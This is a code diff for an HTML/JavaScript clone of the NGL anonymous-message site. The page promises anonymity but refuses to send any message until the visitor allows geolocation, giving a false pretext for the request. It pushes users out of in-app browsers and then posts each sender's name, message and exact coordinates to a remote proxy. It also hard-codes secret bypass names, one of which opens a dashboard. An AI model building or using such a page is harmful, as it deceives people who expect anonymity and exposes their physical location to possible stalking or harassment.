@@ -267,33 +267,55 @@
     .ngl-modal-btn:active { 
       background: #f43f5e; 
     }
-    .ngl-modal-copy { 
-      display: block; 
-      font-size: 1.08rem; 
-      font-weight: 600; 
-      padding: 10px 26px; 
-      background: #f43f5e; 
-      color: #fff; 
-      border-radius: 18px; 
-      border: none; 
-      cursor: pointer; 
-      margin: 18px auto 0 auto; 
-      transition: background 0.18s; 
-    }
+    .denial-help { background: #f8f9fa; border-radius: 12px; padding: 15px; margin-top: 15px; text-align: left; }
+    .denial-help h4 { margin-top: 0; color: #f43f5e; }
+    .denial-help ol { padding-left: 20px; }
+    .denial-help li { margin-bottom: 8px; }
   </style>
 </head>
 <body>
-  <!-- REST OF YOUR HTML CONTENT REMAINS EXACTLY THE SAME -->
   <div class="container" id="fadeContainer">
-    <!-- Your existing profile and form content -->
+    <div class="profile">
+      <div class="profile-row">
+        <div class="profile-img-container">
+          <img src="https://i.imgur.com/6Kt2xTm.jpeg" alt="Jeric Facebook Profile" class="profile-img" />
+        </div>
+        <div class="profile-info">
+          <div class="username">@JericAus</div>
+          <div class="description">
+            Hey it's me Jeric! I made this Ngl-clone because the real one was kinda bland :p so I made some new features, like dice sounds and other thingies, just have some fun inquiring me :D
+          </div>
+        </div>
+      </div>
+      <div class="prompt">send me anonymous messages...</div>
+    </div>
+    <form id="messageForm">
+      <input type="text" name="name" id="name" class="ngl-connect" placeholder="Your name (4-20 characters)" minlength="4" maxlength="20" pattern=".{4,20}|TEST0004|Jebmama3" title="Name must be between 4 and 20 characters." autocomplete="off" required />
+      <div class="textarea-dice-wrap">
+        <textarea name="message" id="message" class="ngl-glassy" placeholder="Send me anonymous messages..." required spellcheck="false"></textarea>
+        <div class="dice-bg"></div>
+        <button type="button" class="dice-button" id="dice" aria-label="Roll dice">🎲</button>
+      </div>
+      <button type="submit" class="send-button">Send!</button>
+    </form>
+    <div class="people-tap-count" id="peopleTapCount">👇 0 people just tapped this button 😢🥀</div>
+    <div class="extra-box ngl-pop-shake" id="mainQuizBox">
+      <a href="#" id="quiz-link" style="color: inherit; text-decoration: none;">Do you want to know me even further?</a>
+    </div>
   </div>
 
-  <!-- Loading spinner -->
   <div id="nglLoading" class="ngl-loading-spinner" style="display:none;">
-    <!-- Existing loading content -->
+    <div class="ngl-spinner">
+      <div class="ngl-spinner-inner">
+        <span class="ngl-spinner-dot"></span>
+        <span class="ngl-spinner-dot"></span>
+        <span class="ngl-spinner-dot"></span>
+        <span class="ngl-spinner-dot"></span>
+      </div>
+      <div class="ngl-spinner-label">Sending...</div>
+    </div>
   </div>
 
-  <!-- Sent overlay (now with proper NGL background) -->
   <div id="sentOverlay">
     <div class="sent-circle">
       <svg class="sent-check" viewBox="0 0 140 140">
@@ -322,22 +344,424 @@
     </div>
   </div>
 
-  <!-- Your existing modals -->
   <div id="nglAskLocationModal" class="ngl-modal-outer">
-    <!-- Modal content -->
-  </div>
-  
-  <div id="nglLocationModal" class="ngl-modal-outer">
-    <!-- Modal content -->
-  </div>
-  
-  <div id="nglInAppModal" class="ngl-modal-outer">
-    <!-- Modal content -->
+    <div class="ngl-modal-inner">
+      <div style="font-size:2.1rem; font-weight:700; margin-bottom:20px; color:#ff007a;">
+        🚦 Wait! Wait!
+      </div>
+      <div id="nglAskLocationModalContent" style="font-size:1.15rem; margin-bottom:14px;">
+        <span class="ngl-em" style="font-size:1.19rem;">Hold on, friend!</span><br>
+        <span style="color:#f43f5e; font-weight:600;">
+          Please turn on your <span class="ngl-em">location</span> so your message can reach me!<br>
+        </span>
+        <span style="display:inline-block; margin-top:9px; font-size:1rem; color:#444;">
+          <b style="color:#ff007a;">No location, no message!</b><br>
+          Since this isn't the real ngl, we need your location to deliver your vibes!
+        </span>
+      </div>
+      <button class="ngl-modal-btn" id="nglAskLocationAllowBtn">Okay, I'll allow it!</button>
+    </div>
   </div>
 
-  <!-- YOUR EXISTING JAVASCRIPT REMAINS EXACTLY THE SAME -->
+  <div id="nglDenialModal" class="ngl-modal-outer">
+    <div class="ngl-modal-inner">
+      <div style="font-size:2rem; font-weight:700; margin-bottom:15px; color:#f43f5e;">
+        ❌ Message Blocked
+      </div>
+      <div style="font-size:1.1rem; margin-bottom:10px;">
+        Your message wasn't sent because location was denied.
+      </div>
+      <div style="font-size:0.95rem; color:#666; margin-bottom:15px;">
+        <b>Tip:</b> Try refreshing the page and allow location when asked. If it still doesn't work, make sure this website's location permission isn't blocked.
+      </div>
+      
+      <div class="denial-help">
+        <h4>If you clicked "Never allow":</h4>
+        <ol>
+          <li><b>Chrome Android:</b> Tap ⋮ → Settings → Site settings → Location → Reset permissions</li>
+          <li><b>Safari iOS:</b> Go to Settings → Safari → Location → Reset permissions</li>
+          <li><b>Desktop:</b> Click the 🔒 icon in address bar → Site settings → Reset permissions</li>
+        </ol>
+      </div>
+      
+      <button class="ngl-modal-btn" onclick="window.location.reload()">Try Again</button>
+    </div>
+  </div>
+
+  <div id="nglInAppModal" class="ngl-modal-outer">
+    <div class="ngl-modal-inner">
+      <div style="font-size:2.1rem; font-weight:700; margin-bottom:20px; color:#f43f5e;">
+        🚫 Unsupported Browser
+      </div>
+      <div style="font-size:1.13rem; margin-bottom:8px;">
+        <b>Messenger/Facebook/Instagram in-app browsers</b> are not supported.<br>
+        <span style="color:#f43f5e;">Please open this link in Chrome, Safari, or your device browser.</span>
+      </div>
+      <div style="font-size:1.02rem; color:#222; margin-bottom:14px;">
+        Tap the <b>three dots (⋮)</b> or <b>Share</b> icon and select <b>Open in Browser</b>.<br>
+        Or tap below to copy the link and paste in your browser.
+      </div>
+      <button class="ngl-modal-btn" id="nglCopyLinkBtn">Copy Link</button>
+    </div>
+  </div>
+
   <script>
-    // All your existing JavaScript code
+    // Detect in-app browsers
+    function isInAppBrowser() {
+      var ua = navigator.userAgent || navigator.vendor || '';
+      return /FBAN|FBAV|FB_IAB|FB4A|FBCR|FBSV|FBID|Messenger|Instagram/i.test(ua);
+    }
+    
+    if (isInAppBrowser()) {
+      document.getElementById('nglInAppModal').style.display = 'flex';
+      document.getElementById('fadeContainer').style.display = 'none';
+    }
+
+    document.getElementById('nglCopyLinkBtn').onclick = function() {
+      navigator.clipboard.writeText(window.location.href).then(function() {
+        document.getElementById('nglCopyLinkBtn').textContent = 'Copied!';
+        setTimeout(() => {
+          document.getElementById('nglCopyLinkBtn').textContent = 'Copy Link';
+        }, 1800);
+      });
+    };
+
+    // Dice functionality
+    const phrases = [
+      "I like u, do u like me too?",
+      "I'm still not over u",
+      "I'll make u mine :p",
+      "u look gud w/out trying",
+      "how does it feel being everyones crush",
+      "would u go on a date with me?",
+      "you want to make new friends?",
+      "would u say yes if someone asked today?",
+      "how many kids do you want to have",
+      "ur aesthetic >"
+    ];
+
+    const diceButton = document.getElementById('dice');
+    const messageField = document.getElementById('message');
+    const diceSound = new Audio('https://raw.githubusercontent.com/myngl-jeric/my-ngl-jeric-site/main/dice.mp3');
+    const tuturuSound = new Audio('https://raw.githubusercontent.com/myngl-jeric/my-ngl-jeric-site/main/Tuturu.mp3');
+    const reZeroSound = new Audio('https://raw.githubusercontent.com/myngl-jeric/my-ngl-jeric-site/main/Re_Zero.mp3');
+    const rollClasses = ['rolling1', 'rolling2', 'rolling3'];
+    let diceRolling = false;
+
+    diceButton.addEventListener('click', () => {
+      if (diceRolling || rollClasses.some(cls => diceButton.classList.contains(cls))) return;
+      diceRolling = true;
+      diceButton.disabled = true;
+      const randomRoll = rollClasses[Math.floor(Math.random() * rollClasses.length)];
+      diceButton.classList.add(randomRoll);
+      diceSound.currentTime = 0;
+      diceSound.play();
+      setTimeout(() => {
+        const randomPhrase = phrases[Math.floor(Math.random() * phrases.length)];
+        messageField.value = randomPhrase;
+        diceButton.classList.remove(...rollClasses);
+        diceButton.disabled = false;
+        diceRolling = false;
+      }, 550);
+    });
+
+    // Message limit system
+    const DAILY_LIMIT = 3;
+    const MSG_STORE_KEY = 'ngl_msg_count';
+    const MSG_DATE_KEY = 'ngl_msg_date';
+
+    function getTodayStr() {
+      const now = new Date();
+      return now.getFullYear() + '-' + (now.getMonth()+1).toString().padStart(2,'0') + '-' + now.getDate().toString().padStart(2,'0');
+    }
+
+    function getMessagesLeft(name) {
+      if (isBypassName(name)) return Infinity;
+      const savedDate = localStorage.getItem(MSG_DATE_KEY);
+      const today = getTodayStr();
+      if(savedDate !== today) {
+        localStorage.setItem(MSG_DATE_KEY, today);
+        localStorage.setItem(MSG_STORE_KEY, DAILY_LIMIT);
+        return DAILY_LIMIT;
+      }
+      let cnt = parseInt(localStorage.getItem(MSG_STORE_KEY), 10);
+      if(isNaN(cnt)) cnt = DAILY_LIMIT;
+      return cnt;
+    }
+
+    function setMessagesLeft(n) {
+      localStorage.setItem(MSG_STORE_KEY, n);
+      localStorage.setItem(MSG_DATE_KEY, getTodayStr());
+    }
+
+    function isBypassName(name) {
+      return name === "TEST0004" || name === "Jebmama3";
+    }
+
+    function updateMessagesLeftUI(name) {
+      const left = getMessagesLeft(name);
+      const leftNum = document.getElementById('messagesLeftNum');
+      const link = document.getElementById('sendAnotherLink');
+      
+      if(isBypassName(name)) {
+        leftNum.textContent = "∞";
+        link.removeAttribute('disabled');
+        link.style.pointerEvents = 'auto';
+        link.style.color = '#fff';
+        link.style.textDecoration = 'underline';
+        link.style.cursor = 'pointer';
+      } else {
+        leftNum.textContent = left;
+        if(left <= 0) {
+          link.setAttribute('disabled', 'true');
+          link.style.pointerEvents = 'none';
+          link.style.color = '#999';
+          link.style.textDecoration = 'none';
+          link.style.cursor = 'not-allowed';
+        } else {
+          link.removeAttribute('disabled');
+          link.style.pointerEvents = 'auto';
+          link.style.color = '#fff';
+          link.style.textDecoration = 'underline';
+          link.style.cursor = 'pointer';
+        }
+      }
+    }
+
+    // Location handling system
+    let locationRequested = false;
+
+    async function handleFormSubmit(event) {
+      event.preventDefault();
+      
+      // Basic validation
+      const name = document.getElementById('name').value.trim();
+      const message = document.getElementById('message').value.trim();
+      
+      if (!validateForm(name, message)) return false;
+      
+      // Special bypass for dashboard
+      if (name === "Jebmama3") {
+        window.location.href = "dashboard.html";
+        return false;
+      }
+
+      // Check message limits
+      const msgLeft = getMessagesLeft(name);
+      if (!isBypassName(name) && msgLeft <= 0) {
+        alert("You've reached your daily message limit. Please try again tomorrow!");
+        return false;
+      }
+
+      // Show loading immediately
+      document.getElementById('nglLoading').style.display = 'flex';
+      
+      try {
+        // First try silent permission (if previously granted)
+        const coords = await getLocation(true);
+        await submitMessage(name, message, coords);
+        showSuccessOverlay(name);
+      } catch (error) {
+        if (!locationRequested) {
+          // Show friendly explanation before system prompt
+          document.getElementById('nglLoading').style.display = 'none';
+          await showLocationExplanation(name);
+          locationRequested = true;
+          return handleFormSubmit(event); // Retry
+        }
+        handleLocationError(error);
+      } finally {
+        document.getElementById('nglLoading').style.display = 'none';
+      }
+    }
+
+    function validateForm(name, message) {
+      if (!isBypassName(name) && (name.length < 4 || name.length > 20)) {
+        alert('Please enter your name between 4 and 20 characters before proceeding.');
+        document.getElementById('name').focus();
+        return false;
+      }
+      if (!message) {
+        alert('Please enter a message');
+        document.getElementById('message').focus();
+        return false;
+      }
+      return true;
+    }
+
+    async function showLocationExplanation(name) {
+      const nameVal = name || 'friend';
+      document.getElementById('nglAskLocationModalContent').innerHTML =
+        `<span class="ngl-em" style="font-size:1.19rem;">Hold on, ${nameVal}!</span><br>
+        <span style="color:#f43f5e; font-weight:600;">
+          Please turn on your <span class="ngl-em">location</span> so your message can reach me!<br>
+        </span>
+        <span style="display:inline-block; margin-top:9px; font-size:1rem; color:#444;">
+          <b style="color:#ff007a;">No location, no message!</b><br>
+          Since this isn't the real ngl, we need your location to deliver your vibes!
+        </span>`;
+      
+      return new Promise((resolve) => {
+        const modal = document.getElementById('nglAskLocationModal');
+        modal.style.display = 'flex';
+        
+        document.getElementById('nglAskLocationAllowBtn').onclick = () => {
+          modal.style.display = 'none';
+          locationRequested = true;
+          resolve();
+          
+          // Critical: The actual location request must happen within 500ms of this click
+          setTimeout(() => {
+            if ('geolocation' in navigator) {
+              navigator.geolocation.getCurrentPosition(
+                () => {}, 
+                () => {},
+                { enableHighAccuracy: false }
+              );
+            }
+          }, 300);
+        };
+      });
+    }
+
+    function getLocation(silent = false) {
+      return new Promise((resolve, reject) => {
+        const options = {
+          enableHighAccuracy: false,
+          timeout: silent ? 1000 : 10000,
+          maximumAge: 0
+        };
+        
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve(pos.coords),
+          err => reject(err),
+          options
+        );
+      });
+    }
+
+    async function submitMessage(name, message, coords) {
+      const response = await fetch('https://my-ngl-jeric-site.vercel.app/api/proxy', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          name: name,
+          message: message,
+          latitude: coords.latitude,
+          longitude: coords.longitude
+        })
+      });
+      
+      if (!response.ok) throw new Error('Submission failed');
+      
+      if (!isBypassName(name)) {
+        let left = getMessagesLeft(name);
+        setMessagesLeft(left - 1);
+      }
+    }
+
+    function handleLocationError(error) {
+      if (error.code === error.PERMISSION_DENIED) {
+        showHardDenialMessage();
+      } else {
+        showModal(
+          "Location Timeout",
+          "Couldn't get your location quickly enough. Please try again in an area with better signal."
+        );
+      }
+    }
+
+    function showHardDenialMessage() {
+      document.getElementById('nglDenialModal').style.display = 'flex';
+    }
+
+    function showModal(title, message) {
+      document.getElementById('nglAskLocationModal').innerHTML = `
+        <div style="text-align:center">
+          <div style="font-size:2rem; font-weight:700; margin-bottom:15px; color:#f43f5e;">${title}</div>
+          <p style="font-size:1.1rem;">${message}</p>
+          <button class="ngl-modal-btn" onclick="document.getElementById('nglAskLocationModal').style.display='none'">OK</button>
+        </div>
+      `;
+      document.getElementById('nglAskLocationModal').style.display = 'flex';
+    }
+
+    function showSuccessOverlay(name) {
+      tuturuSound.currentTime = 0;
+      tuturuSound.play();
+      updateSentOverlayTapCount();
+      updateMessagesLeftUI(name);
+      document.getElementById('sentOverlay').style.display = "flex";
+    }
+
+    function updateSentOverlayTapCount() {
+      document.getElementById('sentPeopleTapCount').textContent =
+        document.getElementById('peopleTapCount').textContent;
+    }
+
+    // Quiz page navigation
+    document.getElementById('quiz-link').addEventListener('click', (e) => {
+      e.preventDefault();
+      const nameInput = document.getElementById('name').value.trim();
+      goToQuizPage(nameInput);
+    });
+
+    document.getElementById('sentQuizLink').addEventListener('click', function(e) {
+      e.preventDefault();
+      const nameValue = window._lastSubmittedName || '';
+      if (!isBypassName(nameValue) && (nameValue.length < 4 || nameValue.length > 20)) {
+        alert('Please enter your name between 4 and 20 characters before proceeding.');
+        document.getElementById('sentOverlay').style.display = 'none';
+        document.getElementById('fadeContainer').classList.remove('fade-out');
+        return false;
+      }
+      const encodedName = encodeURIComponent(nameValue);
+      window.location.href = `quiz.html?name=${encodedName}`;
+    });
+
+    function goToQuizPage(nameValue) {
+      if (!isBypassName(nameValue) && (nameValue.length < 4 || nameValue.length > 20)) {
+        alert('Please enter your name between 4 and 20 characters before proceeding.');
+        document.getElementById('name').focus();
+        return false;
+      }
+      const encodedName = encodeURIComponent(nameValue);
+      window.location.href = `quiz.html?name=${encodedName}`;
+      return false;
+    }
+
+    // Send another message handler
+    document.getElementById('sendAnotherLink').addEventListener('click', function(e) {
+      reZeroSound.currentTime = 0;
+      reZeroSound.play();
+      e.preventDefault();
+      const nameValue = window._lastSubmittedName || document.getElementById('name').value.trim();
+      const msgLeft = getMessagesLeft(nameValue);
+      if (!isBypassName(nameValue) && msgLeft <= 0) {
+        alert("You've reached your daily message limit. Please try again tomorrow!");
+        return;
+      }
+      document.getElementById('sentOverlay').style.display = 'none';
+      document.getElementById('fadeContainer').classList.remove('fade-out');
+      document.getElementById('name').value = nameValue;
+      document.getElementById('message').focus();
+    });
+
+    // Initialize form
+    document.getElementById('messageForm').addEventListener('submit', handleFormSubmit);
+    document.getElementById('name').addEventListener('input', function() {
+      updateMessagesLeftUI(this.value.trim());
+    });
+
+    // Initial setup
+    document.addEventListener('DOMContentLoaded', () => {
+      updateMessagesLeftUI(document.getElementById('name').value.trim());
+      
+      // Safari detection
+      if (/^((?!chrome|android).)*safari/i.test(navigator.userAgent)) {
+        document.documentElement.classList.add('is-safari');
+      }
+    });
   </script>
 </body>
 </html>
